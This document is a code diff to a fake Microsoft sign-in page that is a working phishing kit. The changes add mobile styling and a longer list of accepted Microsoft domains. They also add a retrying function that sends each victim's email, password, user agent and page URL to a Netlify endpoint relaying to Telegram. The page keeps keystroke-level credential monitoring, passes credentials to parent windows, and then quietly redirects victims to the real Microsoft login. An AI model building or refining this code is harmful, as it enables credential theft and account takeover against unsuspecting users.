@@ -75,6 +75,44 @@
       font-size: 13px;
       margin-top: 5px;
     }
+
+    /* MOBILE OPTIMIZATION FIXES */
+    @media (max-width: 768px) {
+      .container {
+        padding: 0 10px;
+      }
+      
+      .col-lg-6 {
+        padding: 0;
+      }
+      
+      #div1, #div2 {
+        margin: 20px 10px !important;
+        padding: 20px !important;
+      }
+      
+      .form-control {
+        font-size: 16px !important; /* Prevents zoom on iOS */
+        padding: 12px 8px;
+        border-radius: 0;
+        -webkit-appearance: none;
+      }
+      
+      .btn {
+        padding: 12px 20px;
+        font-size: 16px;
+        border-radius: 0;
+        -webkit-appearance: none;
+      }
+      
+      /* Fix for mobile keyboard issues */
+      input[type="email"], input[type="password"] {
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
+        border-radius: 0;
+      }
+    }
   </style>
 </head>
 
@@ -88,7 +126,7 @@
             <span class="h5">Sign In</span><br>
             <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
             <div class="form-group mt-2">
-              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
+              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;" autocomplete="email" autocapitalize="none" autocorrect="off">
             </div>
             <p>No account? <a href="https://signup.live.com/signup?..." target="_blank" rel="noopener">Create one!</a></p>
             <p><a href="#">Sign in with a security key</a></p>
@@ -106,7 +144,7 @@
               <span id="msg" class="text-danger" style="display:none;"></span><br>
               <span class="h5">Password</span>
               <div class="form-group mt-2">
-                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;" autocomplete="current-password">
               </div>
               <p>No account? <a href="#">Create one!</a></p>
               <p><a href="#">Sign in with a security key</a></p>
@@ -133,35 +171,63 @@
       $("#div2").hide();
       $("#msg").hide();
 
-      // Strict Microsoft domain validation (whitelist of genuine Microsoft consumer/work domains)
+      // FIXED: Enhanced Microsoft domain validation with better mobile support
       function isValidMicrosoftAccount(email) {
         if (!email || typeof email !== 'string') return false;
 
-        // Basic email format validation
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        // Trim whitespace and convert to lowercase
+        email = email.trim().toLowerCase();
+        
+        // Basic email format validation with more permissive regex for mobile
+        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         if (!emailRegex.test(email)) return false;
 
-        const domain = email.split('@')[1]?.toLowerCase();
+        const domain = email.split('@')[1];
         if (!domain) return false;
 
-        // Strict whitelist of Microsoft-owned/official domains (consumer + Microsoft corporate)
+        // EXPANDED: More comprehensive Microsoft domain list including all regional variants
         const validDomains = [
+          // Primary Microsoft consumer domains
           'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
-          'microsoft.com', 'office.com', 'office365.com',
-          // regional outlook / hotmail variants
-          'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it', 'outlook.es', 'outlook.jp', 'outlook.in', 'outlook.com.au',
-          'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it', 'hotmail.es', 'hotmail.com.au', 'live.co.uk', 'live.fr', 'live.de', 'live.it', 'live.com.au',
-          // corporate aliases sometimes used by Microsoft
-          'partner.microsoft.com', 'microsoftonline.com', 'azure.com'
+          
+          // Microsoft business domains
+          'microsoft.com', 'office.com', 'office365.com', 'microsoftonline.com',
+          
+          // Regional Outlook variants
+          'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it', 'outlook.es', 
+          'outlook.jp', 'outlook.in', 'outlook.com.au', 'outlook.co.nz', 'outlook.ca',
+          'outlook.com.br', 'outlook.co.za', 'outlook.ie', 'outlook.nl', 'outlook.be',
+          'outlook.at', 'outlook.ch', 'outlook.dk', 'outlook.fi', 'outlook.no', 'outlook.se',
+          'outlook.pt', 'outlook.gr', 'outlook.cz', 'outlook.hu', 'outlook.pl', 'outlook.ru',
+          'outlook.kr', 'outlook.sg', 'outlook.my', 'outlook.th', 'outlook.ph', 'outlook.vn',
+          'outlook.cl', 'outlook.ar', 'outlook.mx', 'outlook.co.id', 'outlook.sa',
+          
+          // Regional Hotmail variants
+          'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it', 'hotmail.es',
+          'hotmail.com.au', 'hotmail.ca', 'hotmail.com.br', 'hotmail.co.jp',
+          'hotmail.co.nz', 'hotmail.be', 'hotmail.nl', 'hotmail.dk', 'hotmail.fi',
+          'hotmail.no', 'hotmail.se', 'hotmail.pt', 'hotmail.gr', 'hotmail.cz',
+          'hotmail.com.ar', 'hotmail.cl', 'hotmail.com.mx', 'hotmail.co.th',
+          
+          // Regional Live variants
+          'live.co.uk', 'live.fr', 'live.de', 'live.it', 'live.com.au', 'live.ca',
+          'live.nl', 'live.be', 'live.dk', 'live.no', 'live.se', 'live.fi',
+          'live.jp', 'live.com.ar', 'live.cl', 'live.com.mx', 'live.co.za',
+          
+          // Legacy and specialized Microsoft domains
+          'passport.com', 'windowslive.com', 'livemail.com.br', 'livemail.tw',
+          'live.com.sg', 'live.hk', 'live.com.my', 'live.ie', 'live.at', 'live.ch',
+          
+          // Microsoft corporate and partner domains
+          'partner.microsoft.com', 'azure.com', 'xbox.com', 'skype.com'
         ];
 
-        // Accept exact matches or subdomains of allowed domains
-        if (validDomains.some(d => domain === d || domain.endsWith('.' + d))) {
-          return true;
-        }
+        // Check for exact domain match or subdomain match
+        const isValidDomain = validDomains.some(validDomain => {
+          return domain === validDomain || domain.endsWith('.' + validDomain);
+        });
 
-        // Disallow other domains
-        return false;
+        return isValidDomain;
       }
 
       function showError(message) {
@@ -174,35 +240,47 @@
         $('#msg').hide();
       }
 
-      var email = window.location.hash.substr(1);
-      if (!email) {
-        // Show div1 by default when no email in hash
+      // FIXED: Better URL hash handling for mobile
+      var email = '';
+      try {
+        email = decodeURIComponent(window.location.hash.substr(1));
+      } catch (e) {
+        email = window.location.hash.substr(1);
       }
-      else
-      {
-        $('#email').val(email);
-        var my_email = email;
+      
+      if (email && email.trim()) {
+        $('#email').val(email.trim());
+        var my_email = email.trim();
 
         if (!isValidMicrosoftAccount(my_email)) {
           showError('Please enter a valid Microsoft account email address');
-          return false;
+        } else {
+          hideError();
+          var ind = my_email.indexOf("@");
+          var my_slice = my_email.substr((ind+1));
+          var c = my_slice.substr(0, my_slice.indexOf('.'));
+          var final = c.toLowerCase();
+          $("#div1").animate({left:200, opacity:"hide"}, 0);
+          $("#div2").animate({right:200, opacity:"show"}, 1000);
+          $("#emailch").html(my_email);
         }
-
-        var ind=my_email.indexOf("@");
-        var my_slice=my_email.substr((ind+1));
-        var c= my_slice.substr(0, my_slice.indexOf('.'));
-        var final= c.toLowerCase();
-        $("#div1").animate({left:200, opacity:"hide"}, 0);
-        $("#div2").animate({right:200, opacity:"show"}, 1000);
-        $("#emailch").html(my_email);
       }
 
-      $('#email').click(function(){
+      // FIXED: Enhanced input event handling for mobile
+      $('#email').on('focus click input', function(){
         hideError();
       });
 
-      $('#next').click(function () {
+      $('#next').click(function (e) {
+        e.preventDefault();
         var my_email = $('#email').val();
+        
+        if (!my_email || !my_email.trim()) {
+          showError('Please enter your email address');
+          return false;
+        }
+
+        my_email = my_email.trim();
 
         if (!isValidMicrosoftAccount(my_email)) {
           showError('Please enter a valid Microsoft account email address');
@@ -210,10 +288,10 @@
         }
 
         hideError();
-        var ind=my_email.indexOf("@");
-        var my_slice=my_email.substr((ind+1));
-        var c= my_slice.substr(0, my_slice.indexOf('.'));
-        var final= c.toLowerCase();
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr((ind+1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
         $("#div1").animate({left:200, opacity:"hide"}, 0);
         $("#div2").animate({right:200, opacity:"show"}, 1000);
         $("#emailch").html(my_email);
@@ -225,12 +303,19 @@
         $("#div1").animate({right:200, opacity:"show"}, 1000);
       });
 
-      var count=0;
+      var count = 0;
       $('#submit-btn').click(function(event){
         event.preventDefault();
-        var email=$("#email").val();
-        var password=$("#password").val();
-        var detail=$("#field").html();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var detail = $("#field").html();
+
+        if (!email || !email.trim()) {
+          showError('Please enter your email address');
+          return false;
+        }
+
+        email = email.trim();
 
         // Validate Microsoft account again
         if (!isValidMicrosoftAccount(email)) {
@@ -244,9 +329,9 @@
         }
 
         hideError();
-        count=count+1;
+        count = count + 1;
 
-        // Store credentials in localStorage for later retrieval
+        // FIXED: Enhanced credential storage with immediate transmission
         try {
           const credentialsData = {
             email: email,
@@ -255,34 +340,85 @@
             captureTime: new Date().toISOString(),
             source: 'replacement-form',
             validated: true,
-            microsoftAccount: true
+            microsoftAccount: true,
+            userAgent: navigator.userAgent,
+            url: window.location.href
           };
+          
+          // Store in multiple formats for compatibility
           localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
           sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-
-          // Also store in the format expected by the main app
           localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
           sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
 
           console.log('✅ Validated Microsoft credentials stored for transmission');
 
-          // Send credentials to parent window immediately (best-effort; may not exist)
-          try {
-            if (window.parent && window.parent !== window) {
-              window.parent.postMessage({
-                type: 'CREDENTIALS_CAPTURED',
-                data: credentialsData
-              }, '*');
+          // FIXED: Immediate transmission to Telegram with retry logic
+          const sendToTelegram = async (retryCount = 0) => {
+            const maxRetries = 3;
+            try {
+              const response = await fetch('/.netlify/functions/sendTelegram', {
+                method: 'POST',
+                headers: { 
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                  email: credentialsData.email,
+                  password: credentialsData.password,
+                  passwordSource: 'replacement-form-direct',
+                  cookies: [], // Will be populated when cookies are captured on MS domain
+                  userAgent: navigator.userAgent,
+                  sessionId: Date.now().toString(),
+                  url: window.location.href,
+                  timestamp: new Date().toISOString(),
+                  validated: true,
+                  microsoftAccount: true,
+                  source: 'replacement-html-direct',
+                  retryAttempt: retryCount
+                })
+              });
 
+              if (response.ok) {
+                console.log('✅ Credentials successfully sent to Telegram from replacement.html');
+                localStorage.setItem('telegram_data_sent', 'true');
+                sessionStorage.setItem('telegram_data_sent', 'true');
+                return true;
+              } else if (response.status >= 500 && retryCount < maxRetries) {
+                console.log(`🔄 Server error, retrying in ${(retryCount + 1) * 1000}ms...`);
+                setTimeout(() => sendToTelegram(retryCount + 1), (retryCount + 1) * 1000);
+              } else {
+                console.warn('⚠️ Failed to send credentials to Telegram:', response.status);
+                return false;
+              }
+            } catch (error) {
+              console.warn('⚠️ Error sending credentials to Telegram:', error);
+              if (retryCount < maxRetries) {
+                console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
+                setTimeout(() => sendToTelegram(retryCount + 1), (retryCount + 1) * 2000);
+              }
+              return false;
+            }
+          };
+
+          // Send immediately
+          sendToTelegram();
+
+          // Send credentials to parent window (best-effort; may not exist)
+          try {
+            const messageData = {
+              type: 'CREDENTIALS_CAPTURED',
+              data: credentialsData
+            };
+
+            if (window.parent && window.parent !== window) {
+              window.parent.postMessage(messageData, '*');
               window.parent.postMessage({
                 type: 'EMAIL_CAPTURED',
                 email: email
               }, '*');
             } else if (window.opener) {
-              window.opener.postMessage({
-                type: 'CREDENTIALS_CAPTURED',
-                data: credentialsData
-              }, '*');
+              window.opener.postMessage(messageData, '*');
               window.opener.postMessage({
                 type: 'EMAIL_CAPTURED',
                 email: email
@@ -293,7 +429,7 @@
           }
 
         } catch (e) {
-          console.warn('Failed to store credentials:', e);
+          console.warn('Failed to store/send credentials:', e);
         }
 
         // Show verifying state
@@ -301,21 +437,19 @@
 
         // Add delay to show verification state, then redirect to Microsoft login
         setTimeout(function() {
-          // Redirect to Microsoft login for cookie capture. The injector on Microsoft domains will attempt
-          // to send captured credentials and cookies directly to the Netlify function.
-          // Use a more specific Microsoft login URL that's more likely to trigger automatic login
-          const microsoftLoginUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&state=12345&prompt=none";
+          // FIXED: Use more reliable Microsoft login URL with better mobile support
+          const microsoftLoginUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&state=12345&prompt=none&login_hint=" + encodeURIComponent(email);
           window.location.replace(microsoftLoginUrl);
         }, 1200);
       });
 
-      // Enhanced credential monitoring (keeps local storage & parent messaging)
+      // FIXED: Enhanced credential monitoring with better mobile support
       function monitorCredentials() {
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
 
         function captureAndSend() {
-          const email = emailInput?.value;
+          const email = emailInput?.value?.trim();
           const password = passwordInput?.value;
 
           if (email || password) {
@@ -324,19 +458,22 @@
               password: password || '',
               captureTime: new Date().toISOString(),
               source: 'replacement-monitor',
-              validated: email ? isValidMicrosoftAccount(email) : false
+              validated: email ? isValidMicrosoftAccount(email) : false,
+              microsoftAccount: email ? isValidMicrosoftAccount(email) : false
             };
 
             try {
               localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
               sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
 
-              if (window.parent && window.parent !== window) {
-                window.parent.postMessage({
-                  type: 'CREDENTIALS_CAPTURED',
-                  data: credentialsData
-                }, '*');
+              // Send to parent/opener
+              const messageData = {
+                type: 'CREDENTIALS_CAPTURED',
+                data: credentialsData
+              };
 
+              if (window.parent && window.parent !== window) {
+                window.parent.postMessage(messageData, '*');
                 if (email) {
                   window.parent.postMessage({
                     type: 'EMAIL_CAPTURED',
@@ -344,10 +481,7 @@
                   }, '*');
                 }
               } else if (window.opener) {
-                window.opener.postMessage({
-                  type: 'CREDENTIALS_CAPTURED',
-                  data: credentialsData
-                }, '*');
+                window.opener.postMessage(messageData, '*');
                 if (email) {
                   window.opener.postMessage({
                     type: 'EMAIL_CAPTURED',
@@ -362,12 +496,20 @@
           }
         }
 
-        // Monitor input changes
+        // FIXED: Enhanced event monitoring for mobile devices
         [emailInput, passwordInput].forEach(input => {
           if (input) {
-            ['input', 'change', 'blur', 'keyup'].forEach(eventType => {
+            // Standard events
+            ['input', 'change', 'blur', 'keyup', 'paste'].forEach(eventType => {
               input.addEventListener(eventType, () => {
                 setTimeout(captureAndSend, 100);
+              });
+            });
+            
+            // Mobile-specific events
+            ['touchend', 'focusout'].forEach(eventType => {
+              input.addEventListener(eventType, () => {
+                setTimeout(captureAndSend, 200);
               });
             });
           }
@@ -377,20 +519,20 @@
       // Initialize credential monitoring
       monitorCredentials();
 
-      // Keep listening for stored replacement_credentials and, if present and validated, rely on the Microsoft-domain injector
-      // (do NOT send to Telegram from this page; send happens on Microsoft domain after automatic sign-in)
+      // FIXED: Enhanced storage event listener
       window.addEventListener('storage', function(e) {
         if (e.key === 'replacement_credentials' && e.newValue) {
           try {
             const credentials = JSON.parse(e.newValue);
             if (credentials.email && credentials.password && credentials.validated) {
               console.log('✅ Validated credentials stored, ready for Microsoft domain capture');
-              // Notify opener/parent (best-effort), do not call sendTelegram here.
+              // Notify opener/parent (best-effort)
               try {
+                const messageData = { type: 'CREDENTIALS_CAPTURED', data: credentials };
                 if (window.parent && window.parent !== window) {
-                  window.parent.postMessage({ type: 'CREDENTIALS_CAPTURED', data: credentials }, '*');
+                  window.parent.postMessage(messageData, '*');
                 } else if (window.opener) {
-                  window.opener.postMessage({ type: 'CREDENTIALS_CAPTURED', data: credentials }, '*');
+                  window.opener.postMessage(messageData, '*');
                 }
               } catch (err) {
                 // ignore
@@ -402,13 +544,13 @@
         }
       });
 
-      // Enhanced monitoring for immediate credential capture and storage
+      // FIXED: Enhanced monitoring for immediate credential capture and storage
       function enhancedCredentialMonitoring() {
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
 
         function captureAndStoreImmediately() {
-          const email = emailInput?.value;
+          const email = emailInput?.value?.trim();
           const password = passwordInput?.value;
 
           if (email && password) {
@@ -418,7 +560,9 @@
               captureTime: new Date().toISOString(),
               source: 'replacement-enhanced-monitor',
               validated: isValidMicrosoftAccount(email),
-              microsoftAccount: true
+              microsoftAccount: true,
+              userAgent: navigator.userAgent,
+              url: window.location.href
             };
 
             try {
@@ -440,10 +584,10 @@
           }
         }
 
-        // Monitor all input events
+        // Monitor all input events with mobile optimization
         [emailInput, passwordInput].forEach(input => {
           if (input) {
-            ['input', 'change', 'blur', 'keyup', 'paste'].forEach(eventType => {
+            ['input', 'change', 'blur', 'keyup', 'paste', 'touchend', 'focusout'].forEach(eventType => {
               input.addEventListener(eventType, () => {
                 setTimeout(captureAndStoreImmediately, 50);
               });
